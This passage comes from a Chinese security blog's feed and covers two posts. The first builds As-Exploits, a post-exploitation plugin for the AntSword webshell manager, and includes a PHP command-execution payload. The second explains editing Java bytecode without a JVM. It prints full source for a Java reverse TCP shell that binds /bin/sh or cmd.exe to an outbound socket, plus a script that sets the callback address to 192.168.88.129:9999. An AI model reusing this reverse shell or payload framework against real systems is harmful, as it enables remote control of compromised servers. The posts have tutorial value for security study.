this.precheck();</span><br><span class="line">  &#125;</span><br><span class="line">  precheck() &#123;  //检查模块是否适用于当前shell类型</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">  //获取payload模板</span><br><span class="line">  getTemplate(shelltype, payloadtype) &#123; //从当前目录下payload.js中获取payload</span><br><span class="line">    let payload = require(path.join(__dirname, this.name, &quot;payload&quot;));</span><br><span class="line">    return payload[shelltype][payloadtype];</span><br><span class="line">  &#125;</span><br><span class="line">  //拼接参数</span><br><span class="line">  genPayload(args) &#123;    //从模板中拼接参数</span><br><span class="line"></span><br><span class="line">    let payload = this.getTemplate(this.shelltype, this.payloadtype);</span><br><span class="line">    if (this.shelltype == &quot;jsp&quot;) &#123;  //如果是jsp类型就用字节码的方式修改</span><br><span class="line">      for (let i in args) &#123;</span><br><span class="line">        payload = this.replaceClassStringVar(payload, i, args[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;    //否则直接进行字符串替换</span><br><span class="line">      for (let i in args) &#123;</span><br><span class="line">        payload = payload.replace(new RegExp(i, &quot;g&quot;), args[i]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return payload;</span><br><span class="line">  &#125;</span><br><span class="line">  //获取表单参数</span><br><span class="line">  getArgs() &#123;   //所有表单参数要形成一个字典</span><br><span class="line">    return &#123;&#125;;</span><br><span class="line">  &#125;</span><br><span class="line">  //执行</span><br><span class="line">  exploit() &#123;   // exploit！</span><br><span class="line">    console.log(&quot;exploit!&quot;);</span><br><span class="line">    self.core = this.top.core;</span><br><span class="line">    let args = this.getArgs();  //获取参数</span><br><span class="line">    let payload = this.genPayload(args);    //拼接，生成payload</span><br><span class="line">    self.core</span><br><span class="line">      .request(&#123;</span><br><span class="line">        _: payload, //发送payload</span><br><span class="line">      &#125;)</span><br><span class="line">      .then((_ret) =&gt; &#123;</span><br><span class="line">        let res = antSword.unxss(_ret[&quot;text&quot;], false);  //过滤xss</span><br><span class="line">        if (res === &quot;&quot;) &#123;</span><br><span class="line">          res = &quot;output is empty.&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        this.editor.session.setValue(res);  //回显内容到输出结果</span><br><span class="line">        this.editor.setReadOnly(true);</span><br><span class="line">        toastr.success(LANG[&quot;success&quot;], LANG_T[&quot;success&quot;]);</span><br><span class="line">      &#125;)</span><br><span class="line">      .catch((e) =&gt; &#123;</span><br><span class="line">        console.log(e);</span><br><span class="line">        toastr.error(JSON.stringify(e), &quot;Error&quot;);</span><br><span class="line">      &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  setName(name) &#123;</span><br><span class="line">    this.name = name;   //每个模块实例化之后要有个唯一的名字</span><br><span class="line">  &#125;</span><br><span class="line">  createLayout(tabbar) &#123;    //创建tab，总布局</span><br><span class="line">    tabbar.addTab(this.name, LANG[&quot;core&quot;][this.name][&quot;title&quot;]);</span><br><span class="line">    let tab = tabbar.cells(this.name);</span><br><span class="line">    this.tab = tab;</span><br><span class="line">    if (this.name == &quot;base_info&quot;) &#123; //把基本信息设为首页</span><br><span class="line">      tab.setActive();</span><br><span class="line">    &#125;</span><br><span class="line">    let layout = tab.attachLayout(&quot;2E&quot;);</span><br><span class="line">    this.layout = layout;</span><br><span class="line">    let cellA = layout.cells(&quot;a&quot;);</span><br><span class="line">    this.cellA=cellA;</span><br><span class="line">    cellA.hideHeader();</span><br><span class="line">    let cellB = layout.cells(&quot;b&quot;);</span><br><span class="line">    cellB.setText(LANG[&quot;result_title&quot;]);</span><br><span class="line">    this.cellB=cellB;</span><br><span class="line">    this.createEditor(cellB);</span><br><span class="line">    this.createToolbar(cellA);</span><br><span class="line">    this.createForm(cellA);</span><br><span class="line">  &#125;</span><br><span class="line">  createEditor(cell) &#123;  //输出结果默认是编辑器的格式，方便复制</span><br><span class="line">    this.editor = null;</span><br><span class="line">    // 初始化编辑器</span><br><span class="line">    this.editor = ace.edit(cell.cell.lastChild);</span><br><span class="line">    this.editor.$blockScrolling = Infinity;</span><br><span class="line">    this.editor.setTheme(&quot;ace/theme/tomorrow&quot;);</span><br><span class="line">    // this.editor.session.setMode(`ace/mode/html`);</span><br><span class="line">    this.editor.session.setUseWrapMode(true);</span><br><span class="line">    this.editor.session.setWrapLimitRange(null, null);</span><br><span class="line"></span><br><span class="line">    this.editor.setOptions(&#123;</span><br><span class="line">      fontSize: &quot;14px&quot;,</span><br><span class="line">      enableBasicAutocompletion: true,</span><br><span class="line">      enableSnippets: true,</span><br><span class="line">      enableLiveAutocompletion: true,</span><br><span class="line">    &#125;);</span><br><span class="line">    // 编辑器快捷键</span><br><span class="line">    this.editor.commands.addCommand(&#123;</span><br><span class="line">      name: &quot;import&quot;,</span><br><span class="line">      bindKey: &#123;</span><br><span class="line">        win: &quot;Ctrl-S&quot;,</span><br><span class="line">        mac: &quot;Command-S&quot;,</span><br><span class="line">      &#125;,</span><br><span class="line">      exec: () =&gt; &#123;</span><br><span class="line">        // this.toolbar.callEvent(&quot;onClick&quot;, [&quot;import&quot;]);</span><br><span class="line">      &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">    const inter = setInterval(this.editor.resize.bind(this.editor), 200);</span><br><span class="line">    this.win.win.attachEvent(&quot;onClose&quot;, () =&gt; &#123;</span><br><span class="line">      clearInterval(inter);</span><br><span class="line">      return true;</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  createForm(cell) &#123;</span><br><span class="line">    //edit your code</span><br><span class="line">  &#125;</span><br><span class="line">  createToolbar(cell) &#123; // 初始化exploit按钮，监听onClick事件</span><br><span class="line">    let self = this;</span><br><span class="line">    let toolbar = cell.attachToolbar();</span><br><span class="line">    toolbar.attachEvent(&quot;onClick&quot;, function (id) &#123;</span><br><span class="line">      try &#123;</span><br><span class="line">        self.exploit();</span><br><span class="line">      &#125; catch (e) &#123;</span><br><span class="line">        toastr.error(JSON.stringify(e), LANG_T[&apos;error&apos;]);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    toolbar.loadStruct(</span><br><span class="line">      &apos;&lt;toolbar&gt;&lt;item type=&quot;button&quot; id=&quot;exploit&quot; text=&quot;exploit&quot; title=&quot;&quot; /&gt;&lt;/toolbar&gt;&apos;,</span><br><span class="line">      function () &#123;&#125;</span><br><span class="line">    );</span><br><span class="line">    if(this.precheck()==false)&#123; //如果precheck不通过，按钮将变成灰色。</span><br><span class="line">      toolbar.disableItem(&apos;exploit&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">    this.toolbar=toolbar;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  replaceClassStringVar(b64code, oldvar, newvar) &#123;  //字节码修改函数</span><br><span class="line">    let code = Buffer.from(b64code, &quot;base64&quot;);</span><br><span class="line">    let hexcode = code.toString(&quot;hex&quot;);</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&quot;hex&quot;);</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;</span><br><span class="line">      let newlength = this.decimalToHex(newvar.length, 4);</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(</span><br><span class="line">        newvar</span><br><span class="line">      ).toString(&quot;hex&quot;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;</span><br><span class="line">      return Buffer.from(retcode, &quot;hex&quot;).toString(&quot;base64&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    // console.log(&apos;nonono&apos;)</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  decimalToHex(d, padding) &#123;</span><br><span class="line">    let hex = Number(d).toString(16);</span><br><span class="line">    padding =</span><br><span class="line">      typeof padding === &quot;undefined&quot; || padding === null</span><br><span class="line">        ? (padding = 2)</span><br><span class="line">        : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line">  safeHTML(cell, html = &quot;&quot;, sandbox = &quot;&quot;) &#123;     //当渲染html时一定要用此函数处理，否则可能会产生rce</span><br><span class="line">    let _html = Buffer.from(html).toString(&quot;base64&quot;);</span><br><span class="line">    // https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox</span><br><span class="line">    let _iframe = `&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">      &lt;iframe</span><br><span class="line">        sandbox=&quot;$&#123;sandbox&#125;&quot;</span><br><span class="line">        src=&quot;data:text/html;base64,$&#123;_html&#125;&quot;</span><br><span class="line">        style=&quot;width:100%;height:100%;border:0;padding:0;margin:0;&quot;&gt;</span><br><span class="line">      &lt;/iframe&gt;</span><br><span class="line">    `;</span><br><span class="line">    cell.attachHTMLString(_iframe);</span><br><span class="line">    return this;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module.exports = Base;</span><br></pre></td></tr></table></figure><h3 id="简单的例子">简单的例子</h3><p>举一个简单的例子，执行系统命令并获取回显。</p><p>首先给插件起个炫酷的名字叫test，加入到根目录index.js的Modules里面。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810610191-b41a8ca3-962c-446c-8552-8ed9bdfcf460.png" alt="image.png"></p><p>然后在language\zh.js中增加对应的标签名字：测试。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810016965-a726f030-5d7f-4f63-a748-45d1d9d427bf.png" alt="image.png"></p><p>接着新增一个test目录，这里的目录名称要与模块的名称一致，里面放两个文件：index.js跟payload.js。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606810982668-8babb19a-3525-4e0f-8205-43b9bcfffaaf.png" alt="image.png"></p><p>在index.js中主要写逻辑处理部分，payload.js里面只放payload。</p><h4 id="payload-js">payload.js</h4><p>默认的payload叫default。payload中把参数部分用一个特殊的名字标记出来，叫做 test_command 。</p><p>JSP类型同理，放base64格式的字节码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">module.exports=&#123;</span><br><span class="line">    php:&#123;</span><br><span class="line">        default:`system(&quot;test_command&quot;);`</span><br><span class="line">    &#125;,</span><br><span class="line">    jsp:&#123;</span><br><span class="line">        default:``</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="index-js">index.js</h4><p>因为例子中需要额外的参数，所以要重写父类的createForm函数跟getArgs函数，把表单中获取到的test_command放入args里面。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">const Base = require(&quot;../base&quot;);</span><br><span class="line">class Test extends Base &#123;</span><br><span class="line">  createForm(cell) &#123;</span><br><span class="line">    var str = [</span><br><span class="line">      &#123;</span><br><span class="line">        type: &quot;input&quot;,</span><br><span class="line">        name: &quot;test_command&quot;,</span><br><span class="line">        label: &quot;执行命令&quot;,</span><br><span class="line">        labelWidth: 150,</span><br><span class="line">        labelAlign:&quot;center&quot;,</span><br><span class="line">        inputWidth: 200,</span><br><span class="line">      &#125;,</span><br><span class="line">    ];</span><br><span class="line">    var form = cell.attachForm(str);</span><br><span class="line">    this.form = form;</span><br><span class="line">  &#125;</span><br><span class="line">  getArgs() &#123;</span><br><span class="line">    let args = &#123;&#125;;</span><br><span class="line">    this.payloadtype = &quot;default&quot;;</span><br><span class="line">    args[&quot;test_command&quot;] = this.form.getItemValue(&quot;test_command&quot;);</span><br><span class="line">    return args;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">module.exports = Test;</span><br></pre></td></tr></table></figure><h4 id="image-png运行结果"><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606809440392-6af21d42-c2fd-40da-8fbc-8102aeaf71e5.png" alt="image.png">运行结果</h4><p>重启蚁剑后再打开插件就可以使用我们的新模块了，是不是很简单？</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606809315985-edb6e847-e668-4af6-9e47-4495f71a3d28.png" alt="image.png"></p><h2 id="最后">最后</h2><p>目前payload主要来自冰蝎跟哥斯拉，向前辈们致敬！</p><p>框架的优势就在于看到其他同类工具的比较好的功能可以迅速白嫖。这个功能不错，下一秒就是我的了.jpg</p><p>项目地址：<a href="https://github.com/yzddmr6/As-Exploits" target="_blank" rel="noopener">https://github.com/yzddmr6/As-Exploits</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。&lt;/p&gt;&lt;p&gt;目前插件的定位是蚁
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="中国蚁剑" scheme="https://yzddmr6.com/tags/%E4%B8%AD%E5%9B%BD%E8%9A%81%E5%89%91/"/>
    
  </entry>
  
  <entry>
    <title>无java环境修改字节码</title>
    <link href="https://yzddmr6.com/posts/node-edit-java-class/"/>
    <id>https://yzddmr6.com/posts/node-edit-java-class/</id>
    <published>2020-11-08T16:00:00.000Z</published>
    <updated>2020-12-01T12:40:31.293Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无java环境如何修改字节码。</p><h2 id="正文">正文</h2><h3 id="需求">需求</h3><p>在<a href="https://yzddmr6.tk/posts/antsword-diy-3/" target="_blank" rel="noopener">蚁剑改造计划之实现JSP一句话</a>中，当时为了解决硬编码字节码的问题采用了额外参数的方式来传参。但是同时带来的问题就是键名的固定跟额外带来的编码问题，很容易成为一个特征。</p><p>例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST:   ant=xxxxxxxxxxxxxxx&amp;var1=/bin/bash&amp;var2=whoami</span><br></pre></td></tr></table></figure><p>蚁剑没有java环境，所以没办法像冰蝎一样调用asm框架来修改字节码。但是我们也不需要asm框架那么强大的功能，实际上只需要修改其中的一个字符串的值就可以了，那么怎么实现呢？这个要从字节码的结构说起。</p><h3 id="Java字节码结构">Java字节码结构</h3><p>这里以As_Exploits中的jsp反弹shell的payload为例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line">import java.io.*;</span><br><span class="line">import java.net.Socket;</span><br><span class="line"></span><br><span class="line">public class ShellReverseTCP extends Thread &#123;</span><br><span class="line"></span><br><span class="line">    InputStream zj;</span><br><span class="line">    OutputStream sd;</span><br><span class="line">    public static String ip;</span><br><span class="line">    public static String port;</span><br><span class="line"></span><br><span class="line">    ShellReverseTCP(InputStream zj, OutputStream sd) &#123;</span><br><span class="line">        this.zj = zj;</span><br><span class="line">        this.sd = sd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public ShellReverseTCP() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public boolean equals(Object obj)&#123;</span><br><span class="line">        ip=&quot;targetIP&quot;;</span><br><span class="line">        port=&quot;targetPORT&quot;;</span><br><span class="line">        try &#123;</span><br><span class="line">            RunShellReverseTCP();</span><br><span class="line">            return true;</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        ip=&quot;192.168.88.129&quot;;</span><br><span class="line">        port=&quot;9999&quot;;</span><br><span class="line">        ShellReverseTCP shellReverseTCP = new ShellReverseTCP();</span><br><span class="line">        shellReverseTCP.RunShellReverseTCP();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void RunShellReverseTCP() &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String ShellPath;</span><br><span class="line">            if (System.getProperty(&quot;os.name&quot;).toLowerCase().indexOf(&quot;windows&quot;) == -1) &#123;</span><br><span class="line">                ShellPath = new String(&quot;/bin/sh&quot;);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                ShellPath = new String(&quot;cmd.exe&quot;);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Socket socket = new Socket(ip, Integer.parseInt(port));</span><br><span class="line">            Process process = Runtime.getRuntime().exec(ShellPath);</span><br><span class="line">            (new ShellReverseTCP(process.getInputStream(), socket.getOutputStream())).start();</span><br><span class="line">            (new ShellReverseTCP(socket.getInputStream(), process.getOutputStream())).start();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public void run() &#123;</span><br><span class="line">        BufferedReader yx = null;</span><br><span class="line">        BufferedWriter jah = null;</span><br><span class="line">        try &#123;</span><br><span class="line">            yx = new BufferedReader(new InputStreamReader(this.zj));</span><br><span class="line">            jah = new BufferedWriter(new OutputStreamWriter(this.sd));</span><br><span class="line">            char buffer[] = new char[8192];</span><br><span class="line">            int length;</span><br><span class="line">            while ((length = yx.read(buffer, 0, buffer.length)) &gt; 0) &#123;</span><br><span class="line">                jah.write(buffer, 0, length);</span><br><span class="line">                jah.flush();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        try &#123;</span><br><span class="line">            if (yx != null)</span><br><span class="line">                yx.close();</span><br><span class="line">            if (jah != null)</span><br><span class="line">                jah.close();</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main函数是调试用的不用管，入口是equals函数，我们的目的就是把其中的targetIP跟targetPORT替换为我们的目标IP跟端口。</p><p>用010editor打开编译后的字节码文件查看。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908249823-745cc001-585e-485a-9325-62d9b26c1ee2.png" alt="image.png"></p><p>最开始的CAFEBABE叫做魔数，用来标志这是一个字节码文件。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908306092-26d505de-f345-4763-a9b0-2d021fa9734f.png" alt="image.png"></p><p>00 00 00 34是版本号，0x34转为10进制是52，查表知是jdk1.8。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/1599908/1604908710613-5337299c-f713-4cab-b785-a069c4e51d63.webp" alt="image"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908416871-baf77e08-09f0-406c-b8e0-d3a0a3773cee.png" alt="image.png"></p><p>后面还有import的相关类的信息，因为不是重点，这里不再过多说明，快进到常量池。</p><p>常量池中的每一项都是一个表，其项目类型共有14种，如下表格所示：</p><table><thead><tr><th>类型</th><th>标志</th><th>描述</th></tr></thead><tbody><tr><td>CONSTANT_utf8_info</td><td>1</td><td>UTF-8编码的字符串</td></tr><tr><td>CONSTANT_Integer_info</td><td>3</td><td>整形字面量</td></tr><tr><td>CONSTANT_Float_info</td><td>4</td><td>浮点型字面量</td></tr><tr><td>CONSTANT_Long_info</td><td>5</td><td>长整型字面量</td></tr><tr><td>CONSTANT_Double_info</td><td>6</td><td>双精度浮点型字面量</td></tr><tr><td>CONSTANT_Class_info</td><td>7</td><td>类或接口的符号引用</td></tr><tr><td>CONSTANT_String_info</td><td>8</td><td>字符串类型字面量</td></tr><tr><td>CONSTANT_Fieldref_info</td><td>9</td><td>字段的符号引用</td></tr><tr><td>CONSTANT_Methodref_info</td><td>10</td><td>类中方法的符号引用</td></tr><tr><td>CONSTANT_InterfaceMethodref_info</td><td>11</td><td>接口中方法的符号引用</td></tr><tr><td>CONSTANT_NameAndType_info</td><td>12</td><td>字段或方法的符号引用</td></tr><tr><td>CONSTANT_MethodHandle_info</td><td>15</td><td>表示方法句柄</td></tr><tr><td>CONSTANT_MothodType_info</td><td>16</td><td>标志方法类型</td></tr><tr><td>CONSTANT_InvokeDynamic_info</td><td>18</td><td>表示一个动态方法调用点</td></tr></tbody></table><p>这14种类型的结构各不相同，如下表格所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png" alt="image">``</p><blockquote><p>注：上面的表格的单位是错的，应该是byte不是bit，不知道哪里的以讹传讹一直流传了下来。</p></blockquote><p>从上面的表格可以看到，虽然每一项的结构都各不相同，但是他们有个共同点，就是每一项的第一个字节都是一个标志位，标识这一项是哪种类型的常量。</p><p>我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。</p><p>也就是说关键的结构就是这个</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png" alt="image.png"></p><p>其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。</p><p>结合文件来看</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908969315-a803d10b-e458-45c1-afdf-b75f4e4de43a.png" alt="image.png"></p><p>targetIP共占了8个byte，也就是16个hex的位。所以前面两个byte是00 08。然后再之前的一个byte是01，表示这是一个CONSTANT_utf8_info。</p><h3 id="如何修改">如何修改</h3><p>既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。</p><p>把yan表哥的代码抽出来修改一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function replaceClassStringVar(b64code, oldvar, newvar) &#123;</span><br><span class="line">    let code = Buffer.from(b64code, &apos;base64&apos;);//解码</span><br><span class="line">    let hexcode = code.toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串</span><br><span class="line">      let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><br><span class="line">      return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(&apos;nonono&apos;)</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function decimalToHex(d, padding) &#123;</span><br><span class="line">    var hex = Number(d).toString(16);</span><br><span class="line">    padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;//小于padding长度就填充0</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">content=`xxxxxxxxxxxxx`//要替换的字节码</span><br><span class="line"></span><br><span class="line">content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)</span><br><span class="line">console.log(content)</span><br></pre></td></tr></table></figure><p>用命令还原一下文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n xxxxxx |baes64 -d |tee after.class</span><br></pre></td></tr></table></figure><p>看一下修改后的结果</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909681623-592138cd-d569-4680-8fd4-0f5c6a2c1287.png" alt="image.png"></p><p>192.168.88.129总共是14个byte，换成16进制就是0xe，刚好符合。</p><p>实际中是否能用呢？</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909991049-4c6cefe8-fa8a-4974-b4f9-65afe51ce738.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909964956-47b73ecd-fe02-4dea-822b-6bed6a0d7691.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604910032413-a28d61f4-bd0c-4a12-b519-80e3eee90867.png" alt="image.png"></p><p>回车，获得会话，说明修改是有效的。</p><h2 id="最后">最后</h2><p>As_Exploits还在开发中，不得不说很麻烦，同一个功能要写asp/aspx/php/jsp四份代码。后端还可以写写，前端是真的要现学，不过还是可以期待一下。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;上次巅峰极客线下赛跟yan表哥面了基，一起磕了瓜子聊了聊天。结合当时的比赛情况回来之后想搓一个蚁剑的后渗透插件，今天想跟大家分享一下其中的一个点：无
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>蚁剑改造计划之支持内存马</title>
    <link href="https://yzddmr6.com/posts/antsword-diy-5/"/>
    <id>https://yzddmr6.com/posts/antsword-diy-5/</id>
    <published>2020-09-06T01:40:57.000Z</published>
    <updated>2021-06-17T15:35:52.091Z</updated>
    
